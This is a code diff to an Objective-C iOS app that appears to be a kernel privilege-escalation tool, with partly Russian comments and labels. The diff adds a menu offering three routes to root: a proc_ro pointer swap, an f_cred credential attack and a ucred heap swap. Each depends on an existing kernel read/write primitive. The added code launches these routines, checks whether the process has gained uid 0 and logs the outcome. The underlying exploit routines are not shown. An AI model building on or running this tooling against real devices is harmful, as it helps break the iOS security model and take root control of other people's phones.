@@ -89,7 +89,7 @@
                                   color:[UIColor colorWithRed:0.25 green:0.50 blue:0.60 alpha:1.0]];
     [self.scopeButton addTarget:self action:@selector(scopeTapped) forControlEvents:UIControlEventTouchUpInside];
 
-    self.attackButton = [self makeButton:@"Атака (f_cred → root)"
+    self.attackButton = [self makeButton:@"Root (E11 / f_cred / E9)"
                                    color:[UIColor colorWithRed:0.65 green:0.20 blue:0.20 alpha:1.0]];
     [self.attackButton addTarget:self action:@selector(attackTapped) forControlEvents:UIControlEventTouchUpInside];
 
@@ -390,6 +390,32 @@
 }
 
 - (void)attackTapped {
+    if (!KPRunner.hasKRW || self.jobRunning) return;
+    UIAlertController *sheet = [UIAlertController
+        alertControllerWithTitle:@"Root paths"
+        message:@"E11 = proc_ro swap (временный root, восстановление обязательно)"
+        preferredStyle:UIAlertControllerStyleActionSheet];
+    __weak typeof(self) weakSelf = self;
+    [sheet addAction:[UIAlertAction actionWithTitle:@"E11 proc_ro swap (root)"
+                                              style:UIAlertActionStyleDefault
+                                            handler:^(UIAlertAction *a) {
+        [weakSelf runRootProcRoSwap];
+    }]];
+    [sheet addAction:[UIAlertAction actionWithTitle:@"f_cred attack"
+                                              style:UIAlertActionStyleDefault
+                                            handler:^(UIAlertAction *a) {
+        [weakSelf runFgAttack];
+    }]];
+    [sheet addAction:[UIAlertAction actionWithTitle:@"ucred heap swap (E9)"
+                                              style:UIAlertActionStyleDefault
+                                            handler:^(UIAlertAction *a) {
+        [weakSelf runRootSwap];
+    }]];
+    [sheet addAction:[UIAlertAction actionWithTitle:@"Отмена" style:UIAlertActionStyleCancel handler:nil]];
+    [self presentViewController:sheet animated:YES completion:nil];
+}
+
+- (void)runFgAttack {
     if (!KPRunner.hasKRW || ![self beginJob]) return;
     self.statusLabel.text = @"Атака (f_cred → root)…";
     [[KPLog shared] append:@"[RESULT] АТАКА: запуск"];
@@ -400,6 +426,27 @@
             BOOL win = [report containsString:@"ROOT-FS WIN"] || [report containsString:@"ROOT (filesystem) WIN"] || [report containsString:@"SOCKET-ROOT WIN"] || [report containsString:@"RAW-SOCKET WIN"] || [report containsString:@"UID-0 WIN"];
             [[KPLog shared] appendFormat:win ? @"[RESULT] АТАКА: УСПЕШЕН ★★" : @"[RESULT] АТАКА: FAIL — см. [ATK]/[RPT]"];
             self.statusLabel.text = win ? @"АТАКА УСПЕШНА — root" : @"Атака не прошла — см. лог";
+            self.jobRunning = NO;
+            [self updateExperimentButtons];
+        });
+    });
+}
+
+// E11: proc_ro pointer swap — temporary root (getuid()==0 + /private/var/root
+// write probe), then IMMEDIATELY restore. Must not exit/exec while swapped.
+- (void)runRootProcRoSwap {
+    if (!KPRunner.hasKRW || ![self beginJob]) return;
+    self.statusLabel.text = @"E11: proc_ro swap → root… (restore обязателен)";
+    [[KPLog shared] append:@"[RESULT] E11: proc_ro swap — запуск"];
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        NSString *report = [KPDump procRoSwapReport];
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [[KPLog shared] append:report];
+            BOOL root = (getuid() == 0);
+            BOOL win = root || [report containsString:@"UID-0 WIN"] || [report containsString:@"ROOT"];
+            [[KPLog shared] appendFormat:win ? @"[RESULT] E11: УСПЕШЕН ★★ (uid=%d)" : @"[RESULT] E11: FAIL — см. лог", (int)getuid()];
+            self.statusLabel.text = root ? [NSString stringWithFormat:@"E11 PASS: uid %d — СРАЗУ закрой/не exec", (int)getuid()]
+                                          : @"E11 завершён — см. лог";
             self.jobRunning = NO;
             [self updateExperimentButtons];
         });
